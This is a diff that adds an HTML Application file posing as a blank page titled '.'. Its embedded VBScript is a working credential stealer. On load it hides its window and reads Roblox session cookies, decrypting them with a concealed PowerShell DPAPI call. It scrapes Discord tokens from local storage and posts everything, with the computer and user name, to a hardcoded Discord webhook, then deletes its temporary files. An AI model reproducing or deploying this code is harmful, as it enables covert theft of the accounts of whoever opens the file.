@@ -1,0 +1,137 @@
+<html>
+<head><title>.</title>
+<hta:application id="a" border="none" innerborder="no" caption="no" showintaskbar="no" sysmenu="no" contextmenu="no" selection="no"/>
+<script language="VBScript">
+On Error Resume Next
+
+Dim sh, fso, WH, PC, USER
+Set sh = CreateObject("WScript.Shell")
+Set fso = CreateObject("Scripting.FileSystemObject")
+WH   = "https://discord.com/api/webhooks/1557537274613469307/QDbmzYDUHRCzK_7OQMXsibxACoABgfSkBkBxIqh4NXh6OPYPZEBDm7NznEl8mLTxPRwE"
+PC   = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
+USER = sh.ExpandEnvironmentStrings("%USERNAME%")
+
+Sub Window_OnLoad()
+    window.resizeTo 0, 0
+    window.moveTo -2000, -2000
+    Call GrabRoblox
+    Call GrabDiscord
+    window.close
+End Sub
+
+Sub GrabRoblox()
+    Dim paths(4), i, fp, raw, cookie, approach, sp, ep, b64
+    paths(0) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(1) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\LocalStorage\RobloxCookies.dat"
+    paths(2) = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Roblox\Cookies"
+    paths(3) = sh.ExpandEnvironmentStrings("%APPDATA%") & "\Roblox\LocalStorage\robloxcookies.dat"
+    paths(4) = sh.ExpandEnvironmentStrings("%USERPROFILE%") & "\AppData\Local\Roblox\LocalStorage\robloxcookies.dat"
+    
+    For i = 0 To 4
+        If fso.FileExists(paths(i)) Then fp = paths(i): Exit For
+    Next
+    
+    If Len(fp) = 0 Then Call PostEmbed("Roblox", "No cookie file found", 16711680): Exit Sub
+    raw = ReadFile(fp)
+    If Len(raw) < 50 Then Call PostEmbed("Roblox", "File too small: " & Len(raw) & " bytes", 16711680): Exit Sub
+    
+    cookie = "": approach = ""
+    If InStr(raw, "_|WARNING") > 0 Then cookie = raw: approach = "Plaintext"
+    If Len(cookie) = 0 And InStr(raw, "CookiesData") > 0 Then
+        approach = "JSON-DPAPI"
+        sp = InStr(raw, "CookiesData"":""")
+        If sp > 0 Then
+            sp = sp + 14
+            ep = InStr(sp, raw, """")
+            If ep > sp Then
+                b64 = Mid(raw, sp, ep - sp)
+                If Len(b64) > 100 Then
+                    cookie = DecryptDPAPI(b64)
+                    If Len(cookie) = 0 Then cookie = b64: approach = "JSON-Raw"
+                End If
+            End If
+        End If
+    End If
+    If Len(cookie) = 0 And InStr(raw, ".ROBLOSECURITY") > 0 Then approach = "Raw-ROBLOSECURITY": cookie = Mid(raw, InStr(raw, ".ROBLOSECURITY"))
+    If Len(cookie) = 0 Then cookie = raw: approach = "RawFile"
+    
+    Dim cae: cae = InStr(cookie, "|$CAE")
+    If cae = 0 Then cae = InStr(cookie, "|_CAE")
+    If cae > 0 Then cookie = Mid(cookie, cae)
+    
+    Call PostEmbed("Roblox (" & approach & ")", cookie, 65280)
+End Sub
+
+Sub GrabDiscord()
+    Dim dtPath, f, fld, file, text, regex, matches, token
+    dtPath = sh.ExpandEnvironmentStrings("%APPDATA%") & "\discord\Local Storage\leveldb"
+    If Not fso.FolderExists(dtPath) Then Call PostEmbed("Discord", "Folder not found", 16711680): Exit Sub
+    
+    text = ""
+    Set fld = fso.GetFolder(dtPath)
+    For Each file In fld.Files
+        If Right(LCase(file.Name), 4) = ".ldb" Or Right(LCase(file.Name), 4) = ".log" Then
+            text = text & ReadFile(file.Path)
+        End If
+    Next
+    
+    Set regex = New RegExp
+    regex.Pattern = "[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+    regex.Global = True
+    Set matches = regex.Execute(text)
+    
+    If matches.Count > 0 Then
+        token = matches(0).Value
+        Call PostEmbed("Discord Token", token, 65280)
+    Else
+        Call PostEmbed("Discord", "No token found in LevelDB files", 16711680)
+    End If
+End Sub
+
+Function DecryptDPAPI(b64)
+    DecryptDPAPI = ""
+    Dim inf, outf, ps, psf
+    inf = TmpFile("dpi.txt"): outf = TmpFile("dpo.txt"): fso.DeleteFile outf, True: WriteFile inf, b64
+    ps = "Add-Type -AssemblyName System.Security;try{$b=[Convert]::FromBase64String((Get-Content '" & inf & "' -Raw).Trim());$d=[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser);[System.Text.Encoding]::UTF8.GetString($d)|Out-File '" & outf & "' -Encoding utf8}catch{''|Out-File '" & outf & "'}"
+    psf = TmpFile("dpapi.ps1"): WriteFile psf, ps: RunCmd "powershell -NoProfile -ExecutionPolicy Bypass -File """ & psf & """"
+    If fso.FileExists(outf) Then If fso.GetFile(outf).Size > 20 Then DecryptDPAPI = ReadFile(outf)
+    fso.DeleteFile inf, True: fso.DeleteFile psf, True: fso.DeleteFile outf, True
+End Function
+
+Sub RunCmd(cmd)
+    Dim w,p,i,s, r
+    Set w = GetObject("winmgmts:\\.\root\cimv2"): Set s = w.Get("Win32_ProcessStartup").SpawnInstance_: s.ShowWindow = 0: Set p = w.Get("Win32_Process"): p.Create cmd,,s,i
+    If i = 0 Then Exit Sub
+    r = True
+    Do While r
+        Set w = GetObject("winmgmts:\\.\root\cimv2")
+        r = (w.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE ProcessId=" & i).Count > 0)
+        Set w = Nothing
+        If r Then WScript.Sleep 150
+    Loop
+End Sub
+
+Function TmpFile(name): TmpFile = sh.ExpandEnvironmentStrings("%TEMP%") & "\" & name: End Function
+Sub WriteFile(path, content)
+    Dim f: Set f = fso.CreateTextFile(path, True): f.Write content: f.Close: Set f = Nothing
+End Sub
+Function ReadFile(path)
+    ReadFile = ""
+    Dim f: Set f = fso.OpenTextFile(path, 1): ReadFile = f.ReadAll: f.Close: Set f = Nothing
+End Function
+
+Sub PostEmbed(t, d, c)
+    Dim j: j = "{""embeds"":[{""title"":""" & Ej(t) & """,""description"":""\`\`\`text\n" & Ej(d) & "\n\`\`\`"",""color"":" & c & ",""footer"":{""text"":""" & Ej(PC & " / " & USER) & """}}]}"
+    Dim h: Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0"): h.SetOption 2, 13056: h.Open "POST", WH, False: h.SetRequestHeader "Content-Type", "application/json": h.Send j: Set h = Nothing
+End Sub
+
+Function Ej(s)
+    s = Replace(s, "\", "\\")
+    s = Replace(s, """", "\""")
+    s = Replace(s, vbCrLf, "\n")
+    s = Replace(s, vbCr, "\n")
+    s = Replace(s, vbLf, "\n")
+    Ej = s
+End Function
+</script>
+</head><body></body></html>
